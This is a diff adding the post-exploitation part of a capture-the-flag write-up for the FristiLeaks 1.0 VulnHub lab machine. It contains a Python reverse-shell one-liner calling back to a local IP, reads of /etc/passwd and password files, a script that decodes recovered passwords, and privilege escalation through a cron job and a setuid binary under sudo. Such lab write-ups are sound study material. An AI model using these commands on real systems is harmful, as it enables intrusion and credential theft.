@@ -131,3 +131,219 @@ wget http://192.168.1.27/fristi/uploads/kekshell.php.png?cmd=%2Fbin%2Fbash%20-i%
 ```
 
 ## Post Exploitation
+
+``` bash
+bash-4.1$ id
+uid=48(apache) gid=48(apache) groups=48(apache)
+bash-4.1$ pwd
+/var/www/html/fristi/uploads
+bash-4.1$ ls -la
+total 28
+drwxrwxrwx. 2 apache apache 4096 Aug 20 19:36 .
+drwxr-xr-x  3 apache apache 4096 Nov 17  2015 ..
+-r--r--r--. 1 apache apache    4 Nov 17  2015 index.html
+-rw-r--r--  1 apache apache 1213 Aug 20 19:14 kek.png
+-rw-r--r--  1 apache apache   36 Aug 20 19:29 kekshell.php%00.jpg
+-rw-r--r--  1 apache apache   36 Aug 20 19:27 kekshell.php%00.png
+-rw-r--r--  1 apache apache   36 Aug 20 19:36 kekshell.php.png
+
+bash-4.1$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+[...]
+eezeepz:x:500:500::/home/eezeepz:/bin/bash
+admin:x:501:501::/home/admin:/bin/bash
+fristigod:x:502:502::/var/fristigod:/bin/bash
+fristi:x:503:100::/var/www:/sbin/nologin
+```
+
+- home dir /home/eezeepz readable
+- readable file notes.txt
+
+```
+cat /home/eezeepz/notes.txt
+Yo EZ,
+
+I made it possible for you to do some automated checks,
+but I did only allow you access to /usr/bin/* system binaries. I did
+however copy a few extra often needed commands to my
+homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
+from /home/admin/
+
+Don't forget to specify the full path for each binary!
+
+Just put a file called "runthis" in /tmp/, each line one command. The
+output goes to the file "cronresult" in /tmp/. It should
+run every minute with my account privileges.
+
+- Jerry
+```
+
+- check for usable binary in /usr/bin
+
+``` bash
+ls -l /usr/bin
+total 46700
+# [...]
+lrwxrwxrwx. 1 root root        14 Nov 17  2015 awk -> ../../bin/gawk
+-rwxr-xr-x. 1 root root     29240 Nov 10  2015 base64
+# [...]
+-rwxr-xr-x. 1 root root    267888 Jul 22  2015 cpp
+# [...]
+-rwsr-xr-x. 1 root root     51784 Nov 10  2015 crontab
+# [...]
+-rwxr-xr-x. 1 root root    106168 Nov 10  2015 csplit
+-rwxr-xr-x. 1 root root    119872 Jul 24  2015 curl
+lrwxrwxrwx. 1 root root        13 Nov 17  2015 cut -> ../../bin/cut
+# [...]
+lrwxrwxrwx. 1 root root        14 Nov 17  2015 find -> ../../bin/find
+# [...]
+-rwxr-xr-x. 2 root root    263968 Jul 22  2015 gcc
+# [...]
+-rwxr-xr-x. 2 root root      7184 Nov 10  2015 perl
+-rwxr-xr-x. 2 root root      7184 Nov 10  2015 perl5.10.1
+-rwxr-xr-x. 2 root root     44726 Nov 10  2015 perlbug
+-rwxr-xr-x. 1 root root       224 Nov 10  2015 perldoc
+-rwxr-xr-x. 2 root root     44726 Nov 10  2015 perlthanks
+# [...]
+-rwxr-xr-x. 1 root root   3232368 Jul  9  2015 php
+-rwxr-xr-x. 1 root root   3243504 Jul  9  2015 php-cgi
+# [...]
+-rwxr-xr-x. 1 root root        78 Jul 23  2015 pydoc
+-rwxr-xr-x. 2 root root      4864 Jul 23  2015 python
+lrwxrwxrwx. 1 root root         6 Nov 17  2015 python2 -> python
+-rwxr-xr-x. 2 root root      4864 Jul 23  2015 python2.6
+# [...]
+```
+
+- try to create perl reverse shell in /tmp/runthis
+
+```
+```
+
+- try to create a python reverse shell in /tmp/tunthis
+
+``` bash
+/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.23",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+- get TTy and explore the /home/admin
+
+``` bash
+sh-4.1$ sudo su
+sudo su
+sudo: sorry, you must have a tty to run sudo
+sh-4.1$ /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
+/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
+[admin@Host-007 ~]$ s -l
+ls -l
+total 632
+-rwxr-xr-x 1 admin     admin      45224 Nov 18  2015 cat
+-rwxr-xr-x 1 admin     admin      48712 Nov 18  2015 chmod
+-rw-r--r-- 1 admin     admin        737 Nov 18  2015 cronjob.py
+-rw-r--r-- 1 admin     admin         21 Nov 18  2015 cryptedpass.txt
+-rw-r--r-- 1 admin     admin        258 Nov 18  2015 cryptpass.py
+-rwxr-xr-x 1 admin     admin      90544 Nov 18  2015 df
+-rwxr-xr-x 1 admin     admin      24136 Nov 18  2015 echo
+-rwxr-xr-x 1 admin     admin     163600 Nov 18  2015 egrep
+-rwxr-xr-x 1 admin     admin     163600 Nov 18  2015 grep
+-rwxr-xr-x 1 admin     admin      85304 Nov 18  2015 ps
+-rw-r--r-- 1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
+[admin@Host-007 ~]$ cat cryptedpass.txt     # admin password
+mVGZ3O3omkJLmy2pcuTq
+[admin@Host-007 ~]$ cat whoisyourgodnow.txt # fristigod password
+=RFn0AKnlMHMPIzpyuTI0ITG
+```
+
+- crypt script cryptpass.py
+
+``` python
+#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
+import base64,codecs,sys
+
+def encodeString(str):
+    base64string= base64.b64encode(str)                 # base64
+    return codecs.encode(base64string[::-1], 'rot13')   # rot13
+
+cryptoResult=encodeString(sys.argv[1])
+print cryptoResult
+```
+
+- my decrypt script:
+
+``` python
+import base64, codecs
+
+def decodeStr(string):
+	rot13string = codecs.decode(string, 'rot13')
+	base64string = rot13string[::-1]                    # retrives base64 from rot13
+	password = base64.b64decode(base64string)           # retrives password from base64
+	return password
+
+encoded_string = "mVGZ3O3omkJLmy2pcuTq"     # change this string
+decoded_string = decodeStr(encoded_string)
+print(decoded_string.decode('utf-8'))
+```
+
+- switch user to fristigod and explore /home/fristigod
+
+``` bash
+su - fristigod
+Password: LetThereBeFristi!
+
+-bash-4.1$ id
+uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
+-bash-4.1$ pwd
+/var/fristigod
+-bash-4.1$ ls -la
+total 16
+drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .
+drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..
+-rw-------   1 fristigod fristigod  864 Nov 25  2015 .bash_history
+drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff
+-bash-4.1$ cd .secret_admin_stuff
+-bash-4.1$ ls -la
+total 16
+drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25  2015 .
+drwxr-x---  3 fristigod fristigod 4096 Nov 25  2015 ..
+-rwsr-sr-x  1 root      root      7529 Nov 25  2015 doCom       # not exe from fristigod
+```
+
+- after a few minutes I realized that the bash_history file had some suggestions
+
+``` bash
+-bash-4.1$ cat .bash_history
+ls
+pwd
+ls -lah
+cd .secret_admin_stuff/
+ls
+./doCom
+./doCom test
+sudo ls
+exit
+cd .secret_admin_stuff/
+ls
+./doCom
+sudo -u fristi ./doCom ls / ####################################### fristi is the auth user
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+exit
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
+# [...]
+-bash-4.1$ sudo -u fristi ./doCom ls /
+[sudo] password for fristigod: LetThereBeFristi!
+bin   dev  home  lib64	     media  opt   root	selinux  sys  usr
+boot  etc  lib	 lost+found  mnt    proc  sbin	srv	 tmp  var
+
+-bash-4.1$ sudo -u fristi ./doCom ls /root
+fristileaks_secrets.txt
+
+-bash-4.1$ sudo -u fristi ./doCom cat /root/fristileaks_secrets.txt
+Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
+I wonder if you beat it in the maximum 4 hours it's supposed to take!
+Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
+
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+```
